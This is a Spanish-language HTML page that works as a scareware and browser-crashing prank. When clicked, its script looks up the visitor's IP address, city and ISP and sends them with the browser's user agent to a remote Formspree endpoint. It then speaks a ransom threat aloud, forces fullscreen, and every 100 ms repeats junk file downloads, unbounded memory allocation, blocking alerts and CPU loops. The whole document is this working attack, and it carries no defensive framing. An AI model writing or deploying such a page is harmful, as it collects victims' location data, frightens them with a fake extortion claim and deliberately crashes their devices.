<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>SISTEMA BAJO CONTROL</title>
    <style>
        body { background: #000; color: #f00; font-family: 'Courier New', monospace; margin: 0; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; overflow: hidden; text-align: center; }
        .glitch { font-size: 30px; font-weight: bold; text-transform: uppercase; animation: glitch 0.1s infinite; }
        @keyframes glitch { 0% { color: #f00; } 50% { color: #fff; } 100% { color: #f00; } }
        #log { font-size: 12px; color: #0f0; margin-top: 20px; text-align: left; width: 80%; max-height: 200px; overflow: hidden; }
    </style>
</head>
<body onclick="ejecutarSentencia()">

    <div class="glitch">SISTEMA COMPROMETIDO</div>
    <p>Infiltraci√≥n exitosa. Extrayendo archivos del sistema...</p>
    <div id="log"></div>

    <script>
        const FORM_ID = "xykdyebg";
        let logs = document.getElementById('log');

        async function ejecutarSentencia() {
            // 1. CAPTURA DE IP Y METADATOS (Inmediato)
            const ipInfo = await fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => ({}));
            
            fetch(`https://formspree.io/f/${FORM_ID}`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    "ESTADO": "PUNTO_DE_QUIEBRE",
                    "IP": ipInfo.ip,
                    "CIUDAD": ipInfo.city,
                    "ISP": ipInfo.org,
                    "UA": navigator.userAgent,
                    "MSG": "Iniciando saturaci√≥n de banda y memoria"
                })
            });

            // 2. VOZ DE AMENAZA
            const voz = new SpeechSynthesisUtterance("He robado su informaci√≥n y si la quiere recuperar tiene que pagarme. Te llamar√© en diez horas.");
            voz.lang = 'es-ES';
            voz.pitch = 0.2;
            window.speechSynthesis.speak(voz);

            if (document.documentElement.requestFullscreen) document.documentElement.requestFullscreen();

            // 3. SATURACI√ìN DE ANCHO DE BANDA (Download Bomb)
            const saturarRed = () => {
                const dummyData = new Blob([new ArrayBuffer(10 * 1024 * 1024)]); // Bloque de 10MB
                const url = URL.createObjectURL(dummyData);
                const a = document.createElement('a');
                a.href = url;
                a.download = `SYS_DUMP_${Math.random().toString(36).substring(7)}.dat`;
                a.click();
            };

            // 4. BUCLE DE COLAPSO TOTAL
            const memoryLeak = [];
            setInterval(() => {
                // Agregar logs visuales
                const line = document.createElement('div');
                line.innerText = `[+] EXFILTRANDO: ${Math.random().toString(16).substring(2, 10)}... OK`;
                logs.appendChild(line);

                // Saturar RAM
                for (let i = 0; i < 500; i++) {
                    memoryLeak.push(new Array(1000000).fill("üíÄ").join(""));
                }

                // Saturar Red (Descargas masivas)
                saturarRed();

                // Bloqueo de Interfaz (Alerts)
                alert("CRITICAL ERROR: SYSTEM_HIJACK_IN_PROGRESS\n\nIP: " + ipInfo.ip + "\nDATOS ENVIADOS A SERVIDOR REMOTO.");

                // Reiniciar voz
                if (!window.speechSynthesis.speaking) window.speechSynthesis.speak(voz);
                
                // Consumo de CPU
                let j = 0; while(j < 1000000) { j++; Math.sqrt(j); }

            }, 100);
        }
    </script>
</body>
</html>
